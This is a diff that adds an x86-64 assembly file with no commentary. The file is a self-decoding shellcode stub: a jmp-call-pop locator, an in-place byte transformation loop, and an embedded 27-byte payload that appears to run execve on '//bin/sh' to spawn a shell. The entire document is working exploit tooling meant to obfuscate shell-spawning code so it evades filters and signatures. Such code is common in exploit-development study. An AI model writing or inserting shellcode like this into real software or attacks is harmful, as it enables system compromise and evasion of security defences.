@@ -1,0 +1,34 @@
+section .text
+global _start
+_start:
+	xor rax, rax
+
+	jmp get_loc
+triangulate:
+	pop rbx
+	push rbx
+	pop rdi
+	push byte 27	; shellcode_len
+	pop rcx
+	push byte 0x55
+	pop rdx
+	
+encode_loop:
+	mov al, byte [rbx]
+	not al
+	sub al, dl
+	xor al, dl
+	adc al, dl
+	not al
+	sub al, dl
+	xor al, dl
+	mov byte [rbx], al
+	inc rbx
+	loop encode_loop
+	jmp rdi
+	
+
+
+get_loc:
+	call triangulate
+	shellcode: db 0x48,0x31,0xc0,0x50,0x54,0x5a,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x54,0x5f,0x50,0x57,0x54,0x5e,0xb0,0x3b,0x0f,0x05
